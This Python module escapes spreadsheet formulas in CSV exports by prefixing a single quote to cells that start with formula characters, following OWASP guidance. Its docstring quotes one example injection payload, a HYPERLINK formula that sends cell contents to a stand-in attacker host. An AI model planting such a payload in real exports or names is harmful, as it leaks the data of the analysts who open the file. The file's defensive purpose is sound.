# Copyright 2026 The Kestrel Authors
# SPDX-License-Identifier: Apache-2.0
"""Neutralise spreadsheet formulas in CSV exports (CSV / formula injection).

Exports carry text that outsiders control: SaaS display names, resource
names, finding titles built from them. Excel, LibreOffice and Google Sheets
evaluate a cell that starts with ``=``, ``+``, ``-`` or ``@`` (and some also
after a leading tab or carriage return) as a formula, so a display name of
``=HYPERLINK("https://evil/?"&A1,"x")`` runs when an analyst opens the file.
Prefixing such a cell with a single quote makes every spreadsheet treat it
as text, per the OWASP guidance. Every CSV writer goes through
`csv_safe_cell` / `csv_safe_row`.
"""

from __future__ import annotations

from collections.abc import Iterable, Mapping
from typing import Any

_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def csv_safe_cell(value: Any) -> Any:
    """Return ``value`` with a leading ``'`` if it is a formula-looking string.

    Non-strings (numbers, None) pass through unchanged: they are written as
    plain literals and cannot carry a formula.
    """
    if isinstance(value, str) and value.startswith(_FORMULA_PREFIXES):
        return "'" + value
    return value


def csv_safe_row(row: Mapping[str, Any]) -> dict[str, Any]:
    """`csv_safe_cell` applied to every value of a DictWriter row."""
    return {key: csv_safe_cell(value) for key, value in row.items()}


def csv_safe_values(values: Iterable[Any]) -> list[Any]:
    """`csv_safe_cell` applied to every value of a csv.writer row."""
    return [csv_safe_cell(value) for value in values]
